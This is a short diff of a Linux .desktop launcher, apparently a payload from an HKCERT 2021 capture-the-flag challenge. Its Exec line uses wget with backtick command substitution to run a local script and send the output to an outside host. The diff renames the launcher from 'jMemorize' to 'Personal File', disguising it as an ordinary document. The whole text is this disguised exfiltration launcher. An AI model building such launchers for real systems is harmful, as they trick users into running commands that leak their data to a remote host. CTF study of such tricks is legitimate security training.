@@ -1,4 +1,4 @@
 [Desktop Entry]
 Exec=sh -c "wget http://chal-s2.hkcert21.pwnable.hk:28098/?`/proof*.sh`"
 Type=Application
-Name=jMemorize
+Name=Personal File
